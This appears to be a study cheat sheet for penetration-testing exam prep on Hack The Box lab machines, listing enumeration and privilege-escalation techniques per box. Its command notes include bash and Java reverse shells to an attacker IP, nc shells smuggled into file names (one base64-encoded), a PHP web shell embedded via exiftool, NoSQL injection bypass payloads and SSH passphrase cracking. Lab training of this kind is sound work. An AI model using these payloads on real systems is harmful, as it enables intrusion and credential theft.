### AD Machines

Forest, Active, Monteverde, Reel, Mantis, Blackfield, Search

https://twitter.com/hackthebox_eu/status/1529122562038456320?cxt=HHwWgICzhcu3xLgqAAAA

### Linux Machines

| Machine | Enumeration | Privilege Escalation |
| ------------- | ------------- | ------------- |
| Admirer | Adminer MySQL(local) | Hijacking Python Library | 
| Armageddon | Drupal (2018-7600) | binary snap |
| Backdoor | wordpress LFI proc gdbserver | screen |
| Blocky | dirb javadecompilers wordpress | sudo list |
| Blunder | feroxbuster Extensions [txt] bludit | sudo versions before 1.8.28 |
| Brainfuck | wordpress plugin smtp pop3 | Cryptography |
| Cronos | subdomain wfuzz| crontab |
| Doctor | [ssti-payloads](https://github.com/payloadbox/ssti-payloads) | Splunk |
| Forge | SSRF subdomain ftp | sudo list Python Debugger pdb |
| Forlic | playsms Ook! | BOF |
| Haircut | dirb medium.txt writeable uploads folder | Unknown SUID binary screen |
| Horizontall | wfuzz top1million-110000 strapi | active port 8000 ```local CVE``` ssh tunnel |
| Irked | irc-unrealircd-backdoor | LinPEAS Unknown SUID binary |
| *Jarvis | SQLi phpmyadmin 4.8 RCE | python command injection & systemctl binary |
| Knife | firefox wappalyzer [PHP 8.1.0](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py)| upgrade shell & sudo list |
| Lame | distccd | nmap |
| *Luanne | nmap Supervisor & robots.txt weather | BSD doas & netpgp backup file |
| Magic | [SQLi](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/) bypassing login & <br> File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass) | mysqldump & Unknown SUID binary sysinfo |
| *Mango |  certificate subdomains & <br> [enumerate](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration) credentials of nosql-injection <br> (*Not sure if you can use this script in the exam), reuse | jjs, write root SSH public key | 
| Mirai | nmap, pi.hole, ssh | sudo list, mount, strings |
| Networked | File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass), <br> php command injection | *sudo list |
| Nibbles | page source, directory | sudo list |
| *NineVeh | brute force attack http & https, phpLiteAdmin | crontab, chkrootkit |
| OpenAdmin | OpenNetAdmin, pwd in conf file & <br> [frp](https://github.com/fatedier/frp), cracking passphrase | sudo list, GTFO |
| *Ophiuchi | [Java-Deserialization](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet), SnakeYAML | sudo list, analysis of GO code |
| Passage | CutePHP & password storage location & <br> base64 & cracking | *SUID dbus |
| *Pit | SNMP enum, hide web folder, SeedDMS | NET-SNMP-EXTEND-MIB, monitoring |
| *Poison | LFI, FreeBSD Apache log poisoning | password base64, vncviewer |
| Popcorn | torrent, upload bypass | user cache, motd, Linux PAM | 
| Postman | Redis, ssh, john | [Webmin](https://github.com/KrE80r/webmin_cve-2019-12840_poc) |
| Previse | HTTP [302](https://vk9-sec.com/bypass-30x-redirect-with-burpsuite/), PHP exec, mysql, hashcat 500 | sudo list, [$PATH variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/) |

(*):review before the exam

### Additional command notes

Used in ```Knife``` for upgrade shell

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'
```

Used in ```Luanne``` 

authenticate

```
curl -s http://127.0.0.1:3001/<folder>/ -u <user>:<password>
```

Find the open port

```
netstat -punta || ss -nltpu || netstat -anv
```

Used in ```Magic``` 

image file upload bypass

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
```

dump mysql database data without using mysql client tool

```
mysqldump -u root -p database_name > database_name.sql
```

Used in ```Mango```

[nosql-injection](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/nosql-injection.md): basic authentication bypass

```
# change post data
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

Used in ```Mirai```

```
# check partition
strings /dev/sdb
```

Used in ```Networked```

command injection

```
# method1: vaild file name
echo "" > "; nc -c bash 192.168.0.1 4444 ;"
# method2: use base64 encoding format to avoid file name checking
echo nc -e /bin/bash 192.168.0.1 4444 | base64 -w0
echo "" > "a; echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMC4xIDQ0NDQK | base64 -d | sh; b"
```

[base64](https://linux.die.net/man/1/base64)

```
-w, --wrap=COLS
    Wrap encoded lines after COLS character (default 76). Use 0 to disable line wrapping.
-d, --decode
    Decode data.
-i, --ignore-garbage
    When decoding, ignore non-alphabet characters.
--help
    display this help and exit
--version
    output version information and exit
```

Used in ```Nineveh```

```
# check information in image file
strings -n 20 <image file> 
# extract known file types 
binwalk <image file>
binwalk -e <image file>
```

Used in ```OpenAdmin```

find files containing specific text e.g. password

```
find / -type f \( -iname \*.php -o -iname \*.config -o -iname \*.conf -o -iname \*.ini -o -iname \*.txt \) -exec grep -i 'password\|passwd' {} \; -print 2>&-
```

crack SSH private key passphrase

```
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash -wordlist=rockyou.txt
```

Used in ```Ophiuchi```

one line reverse shell command in Java

```Java
String[] cmdline = { "sh", "-c", "echo 'bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && bash /tmp/revshell.sh" }; 
Runtime.getRuntime().exec(cmdline);
```

Used in ```Pit```

```
# crack SNMP passwords
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt -p <target port> <target ip>
```

```
snmpwalk -v1 -c public <target ip> .
# -v 1|2c|3 SNMP version
# -c community string, like a password
# . [OID]
```
get file access control lists

```
getfacl /usr/local/monitoring
```